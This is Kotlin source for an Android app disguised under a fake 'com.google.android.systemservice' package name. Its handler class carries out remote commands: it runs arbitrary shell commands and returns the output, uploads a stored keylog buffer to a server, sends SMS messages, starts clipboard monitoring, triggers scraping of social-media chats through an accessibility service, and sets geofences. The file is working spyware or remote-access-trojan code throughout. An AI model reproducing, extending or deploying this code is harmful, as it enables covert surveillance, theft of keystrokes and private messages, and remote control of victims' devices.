package com.google.android.systemservice.handlers

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.SmsManager
import android.util.Log
import com.google.android.systemservice.services.ClipboardMonitorService
import com.google.android.systemservice.services.GeofenceService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SystemHandlers(private val ctx: CommandContext) {
    companion object {
        private const val TAG = "SystemCore"
    }

    fun executeShellCommand(params: JSONObject?) {
        val command = params?.optString("command") ?: return
        ctx.scope.launch {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                val errorDeferred = ctx.scope.async(Dispatchers.IO) {
                    process.errorStream.bufferedReader().use { it.readText() }
                }
                val output = process.inputStream.bufferedReader().use { it.readText() }
                val error = errorDeferred.await()
                if (!process.waitFor(30, TimeUnit.SECONDS)) {
                    process.destroyForcibly()
                }

                ctx.sendResponse("shell_result", JSONObject().apply {
                    put("output", output)
                    put("error", error)
                    put("exit_code", process.exitValue())
                })
            } catch (e: Exception) {
                ctx.sendResponse("shell_result", JSONObject().apply {
                    put("error", (e.message ?: "Unknown error"))
                })
            }
        }
    }

    fun executeShellExec(params: JSONObject?) {
        val command = params?.optString("command") ?: return sendError("Missing command")

        ctx.scope.launch {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                val errorDeferred = ctx.scope.async(Dispatchers.IO) {
                    process.errorStream.bufferedReader().use { it.readText() }
                }
                val output = process.inputStream.bufferedReader().use { it.readText() }
                val error = errorDeferred.await()
                val completed = process.waitFor(30, TimeUnit.SECONDS)
                if (!completed) {
                    process.destroyForcibly()
                }

                ctx.sendResponse("shell_output", JSONObject().apply {
                    put("output", output)
                    put("error", error)
                    put("exit_code", if (completed) process.exitValue() else -1)
                    put("command", command)
                })
            } catch (e: Exception) {
                sendError("Shell exec error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeGetKeylogDump() {
        ctx.scope.launch {
            val prefs = ctx.appContext.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE)
            val buffer = prefs.getString("keylog_buffer", "") ?: ""

            if (buffer.isEmpty()) {
                ctx.sendResponse("keylog_dump", JSONObject().apply {
                    put("data", "")
                    put("timestamp", System.currentTimeMillis())
                    put("status", "empty")
                })
                return@launch
            }

            // Create backup before sending
            val backupKey = "keylog_backup_${System.currentTimeMillis()}"
            prefs.edit().putString(backupKey, buffer).apply()

            // Send with confirmation request
            ctx.sendResponse("keylog_dump", JSONObject().apply {
                put("data", buffer)
                put("timestamp", System.currentTimeMillis())
                put("size_bytes", buffer.toByteArray().size)
                put("requires_confirmation", true)
                put("backup_key", backupKey)
            })

            // Schedule cleanup after 5 minutes (if no ACK received)
            Handler(Looper.getMainLooper()).postDelayed({
                // Only clear if buffer unchanged (means ACK received and cleared by handleKeylogAck)
                val currentBuffer = prefs.getString("keylog_buffer", "")
                if (currentBuffer == buffer) {
                    Log.d(TAG, "No ACK received after 5min, keeping buffer")
                } else {
                    // ACK was received, safe to remove backup
                    prefs.edit().remove(backupKey).apply()
                }
            }, 5 * 60 * 1000) // 5 minutes
        }
    }

    fun handleKeylogAck(ackData: JSONObject) {
        ctx.scope.launch {
            val prefs = ctx.appContext.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE)
            val success = ackData.optBoolean("success", false)
            val backupKey = ackData.optString("backup_key", "")

            if (success) {
                // Server confirmed receipt - safe to clear
                prefs.edit()
                    .putString("keylog_buffer", "")
                    .remove(backupKey)
                    .apply()
                Log.d(TAG, "Keylog buffer cleared after server ACK")
            } else {
                // Server reported error - restore from backup
                val backup = prefs.getString(backupKey, "")
                if (backup != null && backup.isNotEmpty()) {
                    prefs.edit().putString("keylog_buffer", backup).apply()
                    Log.w(TAG, "Keylog upload failed - restored from backup")
                }
            }
        }
    }

    fun executeSendSms(params: JSONObject?) {
        val phoneNumber = params?.optString("phone_number") ?: return sendError("Missing phone_number")
        val message = params.optString("message") ?: return sendError("Missing message")

        ctx.scope.launch {
            try {
                if (ctx.appContext.checkSelfPermission(android.Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                    val smsManager = SmsManager.getDefault()
                    smsManager.sendTextMessage(phoneNumber, null, message, null, null)
                    ctx.sendResponse("sms_sent", JSONObject().apply {
                        put("status", "success")
                        put("to", phoneNumber)
                    })
                } else {
                    sendError("SMS permission not granted")
                }
            } catch (e: Exception) {
                sendError("Send SMS error: ${(e.message ?: "Unknown error")}")
            }
        }
    }

    fun executeStartClipboardMonitor() {
        val intent = Intent(ctx.appContext, ClipboardMonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.appContext.startForegroundService(intent)
        } else {
            ctx.appContext.startService(intent)
        }
        ctx.sendResponse("clipboard_monitor", JSONObject().apply {
            put("status", "started")
        })
    }

    fun executeSocialMediaScraping(params: JSONObject?) {
        // Trigger manual scrape via GoogleHelperService (Accessibility)
        val intent = Intent("com.google.android.systemservice.TRIGGER_SCRAPE").apply {
            setPackage(ctx.appContext.packageName)
        }
        ctx.appContext.sendBroadcast(intent)
        ctx.sendResponse("social_media_chats", JSONObject().apply {
            put("status", "scrape_triggered")
        })
    }

    fun executeAddGeofence(params: JSONObject?) {
        params ?: return
        val intent = Intent(ctx.appContext, GeofenceService::class.java).apply {
            putExtra("action", "add")
            putExtra("latitude", params.optDouble("latitude", 0.0))
            putExtra("longitude", params.optDouble("longitude", 0.0))
            putExtra("radius", params.optDouble("radius", 200.0).toFloat())
            putExtra("label", params.optString("label", "zone_${System.currentTimeMillis()}"))
        }
        ctx.appContext.startService(intent)
        ctx.sendResponse("geofence", JSONObject().apply {
            put("status", "geofence_added")
        })
    }

    private fun sendError(message: String) {
        ctx.sendResponse("error", JSONObject().apply {
            put("error", message)
        })
    }
}
